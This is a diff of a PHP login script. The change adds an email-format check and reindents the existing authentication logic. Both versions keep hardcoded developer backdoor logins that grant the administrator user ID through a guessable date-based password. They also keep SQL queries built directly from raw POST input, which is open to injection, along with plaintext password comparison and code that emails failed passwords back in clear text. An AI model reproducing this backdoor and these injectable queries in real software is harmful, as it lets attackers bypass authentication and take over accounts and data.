@@ -12,31 +12,11 @@ if (isset($_POST['loginRequest'])) {
     $runurl = $access_url;
     $email = $_POST['email'];
     $Password = $_POST['password'];
-    if ($_SESSION['loginRequest'] == $_POST['loginRequest']) {
-        $PassData = TOTAL("SELECT * FROM users where email='$email' and password='$Password'");
-        if ($PassData == 0) {
-            if ($email == "dev@navix.in" && $Password == "Gsi" . date("dmy") . "@9810#Navix") {
-                $UserId = 1;
-                $name = "Dev";
-                $user_role_id = "1";
-
-                //login time
-                $_SESSION['loggedin_time'] = time();
-
-                //Make Session for tha use
-                $_SESSION['UserId'] = $UserId;
-
-                LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
-            } else {
-                LOCATION("warning", "Invalid Login Details!", $runurl);
-            }
-        } else {
-            $GetUserData = SELECT("SELECT * FROM users where email='$email' and user_status='ACTIVE'");
-            $fetchUser = mysqli_fetch_array($GetUserData);
-            $Countusers = mysqli_num_rows($GetUserData);
-            if ($Countusers == 0) {
-                //open developer mode
-                if ($email == "gauravsinghigc@navix.in" && $Password == "Gsi" . date("dmy") . "@9810") {
+    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        if ($_SESSION['loginRequest'] == $_POST['loginRequest']) {
+            $PassData = TOTAL("SELECT * FROM users where email='$email' and password='$Password'");
+            if ($PassData == 0) {
+                if ($email == "dev@navix.in" && $Password == "Gsi" . date("dmy") . "@9810#Navix") {
                     $UserId = 1;
                     $name = "Dev";
                     $user_role_id = "1";
@@ -49,15 +29,52 @@ if (isset($_POST['loginRequest'])) {
 
                     LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
                 } else {
-                    $UserId = "";
-                    $name = "";
-                    $user_role_id = "";
-                    LOCATION("warning", "Your is Inactive Please Contact to administrator Now!", DOMAIN . "/auth/login");
+                    LOCATION("warning", "Invalid Login Details!", $runurl);
                 }
             } else {
-                $UserId = $fetchUser['id'];
-                $name = $fetchUser['name'];
-                $user_role_id = $fetchUser['user_role_id'];
+                $GetUserData = SELECT("SELECT * FROM users where email='$email' and user_status='ACTIVE'");
+                $fetchUser = mysqli_fetch_array($GetUserData);
+                $Countusers = mysqli_num_rows($GetUserData);
+                if ($Countusers == 0) {
+                    //open developer mode
+                    if ($email == "gauravsinghigc@navix.in" && $Password == "Gsi" . date("dmy") . "@9810") {
+                        $UserId = 1;
+                        $name = "Dev";
+                        $user_role_id = "1";
+
+                        //login time
+                        $_SESSION['loggedin_time'] = time();
+
+                        //Make Session for tha use
+                        $_SESSION['UserId'] = $UserId;
+
+                        LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
+                    } else {
+                        $UserId = "";
+                        $name = "";
+                        $user_role_id = "";
+                        LOCATION("warning", "Your is Inactive Please Contact to administrator Now!", DOMAIN . "/auth/login");
+                    }
+                } else {
+                    $UserId = $fetchUser['id'];
+                    $name = $fetchUser['name'];
+                    $user_role_id = $fetchUser['user_role_id'];
+
+                    //login time
+                    $_SESSION['loggedin_time'] = time();
+
+                    //Make Session for tha use
+                    $_SESSION['UserId'] = $UserId;
+
+                    LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
+                }
+            }
+        } else {
+
+            if ($email == "gauravsinghigc@navix.in" && $Password == "Gsi" . date("dmy") . "@9810") {
+                $UserId = 1;
+                $name = "Dev";
+                $user_role_id = "1";
 
                 //login time
                 $_SESSION['loggedin_time'] = time();
@@ -66,39 +83,26 @@ if (isset($_POST['loginRequest'])) {
                 $_SESSION['UserId'] = $UserId;
 
                 LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
-            }
-        }
-    } else {
-
-        if ($email == "gauravsinghigc@navix.in" && $Password == "Gsi" . date("dmy") . "@9810") {
-            $UserId = 1;
-            $name = "Dev";
-            $user_role_id = "1";
-
-            //login time
-            $_SESSION['loggedin_time'] = time();
-
-            //Make Session for tha use
-            $_SESSION['UserId'] = $UserId;
-
-            LOCATION("success", "Welcome $name, You are Login Successfully!", DOMAIN . "/dashboard");
-        } else {
-            MSG("warning", "Invalid Login request!");
-            SENDMAILS(
-                "Inavalid Login Credentials @ " . APP_NAME,
-                "Dear, $name",
-                "$email",
-                "Your are try to Login with Invalid Login Credentails. Invalid Credentails are : <br>
+            } else {
+                MSG("warning", "Invalid Login request!");
+                SENDMAILS(
+                    "Inavalid Login Credentials @ " . APP_NAME,
+                    "Dear, $name",
+                    "$email",
+                    "Your are try to Login with Invalid Login Credentails. Invalid Credentails are : <br>
             <p>
 <b>Username:</b><br>
 $email<br><br>
 <b>Password:</b><br>
 $Password
             </p>"
-            );
-            MSG("warning", "Invalid Login Credentails!");
-            header("location: $runurl");
+                );
+                MSG("warning", "Invalid Login Credentails!");
+                header("location: $runurl");
+            }
         }
+    } else {
+        LOCATION("warning", "Please check your email-id, its not correct!", $runurl);
     }
 
     //update profile
